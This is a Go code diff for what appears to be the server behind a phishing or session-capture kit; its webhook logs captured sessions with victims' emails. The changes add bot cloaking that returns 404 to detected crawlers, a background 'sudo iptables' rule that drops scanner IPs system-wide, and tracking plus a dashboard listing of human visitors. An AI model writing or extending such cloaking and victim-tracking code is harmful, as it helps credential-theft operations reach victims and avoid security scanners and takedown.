@@ -44,6 +44,7 @@ type Server struct {
 	upgrader  websocket.Upgrader
 	wsClients map[*websocket.Conn]bool
 	wsMutex   sync.RWMutex
+	botCache  sync.Map
 }
 
 func New(cfg Config) (*Server, error) {
@@ -168,10 +169,22 @@ func (s *Server) broadcast(event map[string]interface{}) {
 
 func (s *Server) botFilter() gin.HandlerFunc {
 	return func(c *gin.Context) {
+		ip := monitor.GetClientIP(c.Request.Header, c.ClientIP())
+
+		// Check cache to prevent terminal flooding for already blocked IPs
+		if _, seen := s.botCache.Load(ip); seen {
+			c.AbortWithStatus(404)
+			return
+		}
+
 		ua := c.GetHeader("User-Agent")
 		if isBot, reason := monitor.IsBot(ua); isBot {
-			ip := monitor.GetClientIP(c.Request.Header, c.ClientIP())
-			log.Printf("[!] Stealth: Blocked %s request from %s (Reason: %s)", c.Request.Method, ip, reason)
+			s.botCache.Store(ip, true)
+			log.Printf("[!] Bot Detected: %s (%s). Silencing and blocking system-wide.", ip, reason)
+
+			// Block the IP system-wide in the background via iptables
+			go exec.Command("sudo", "iptables", "-I", "INPUT", "-s", ip, "-j", "DROP").Run()
+
 			c.AbortWithStatus(404)
 			return
 		}
@@ -337,6 +350,26 @@ func (s *Server) handleWebhook(c *gin.Context) {
 		
 		log.Printf("Session captured for %s from %s [Source: %s]", email, ip, source)
 		c.JSON(200, gin.H{"success": true})
+
+	case "visitor":
+		// Track all visitors for dashboard statistics
+		ua := c.GetHeader("User-Agent")
+		if bodyUA, ok := body["user_agent"].(string); ok && bodyUA != "" {
+			ua = bodyUA
+		}
+		
+		isBot, botName := monitor.IsBot(ua)
+		referer, _ := body["referer"].(string)
+		
+		if err := s.storage.SaveVisitor(source, ip, ua, referer, isBot, botName); err != nil {
+			log.Printf("Error saving visitor: %v", err)
+		}
+		
+		if !isBot {
+			log.Printf("New human visitor from %s [Source: %s]", ip, source)
+		}
+		
+		c.JSON(200, gin.H{"success": true})
 		
 	default:
 		log.Printf("Unknown event: %s", event)
@@ -424,8 +457,36 @@ func (s *Server) handleSubmissions(c *gin.Context) {
 }
 
 func (s *Server) handleVisitors(c *gin.Context) {
-	// This would need to be implemented
-	c.JSON(200, []interface{}{})
+	rows, err := s.storage.DB.Query(`
+		SELECT source, ip, user_agent, is_bot, bot_name, referer, created_at 
+		FROM visitors 
+		ORDER BY created_at DESC 
+		LIMIT 100`)
+	if err != nil {
+		c.JSON(500, gin.H{"error": err.Error()})
+		return
+	}
+	defer rows.Close()
+
+	type VisitorResponse struct {
+		Source    string `json:"source"`
+		IP        string `json:"ip"`
+		UserAgent string `json:"user_agent"`
+		IsBot     bool   `json:"is_bot"`
+		BotName   string `json:"bot_name"`
+		Referer   string `json:"referer"`
+		CreatedAt string `json:"created_at"`
+	}
+
+	var visitors []VisitorResponse
+	for rows.Next() {
+		var v VisitorResponse
+		if err := rows.Scan(&v.Source, &v.IP, &v.UserAgent, &v.IsBot, &v.BotName, &v.Referer, &v.CreatedAt); err != nil {
+			continue
+		}
+		visitors = append(visitors, v)
+	}
+	c.JSON(200, visitors)
 }
 
 func (s *Server) handleRestart(c *gin.Context) {
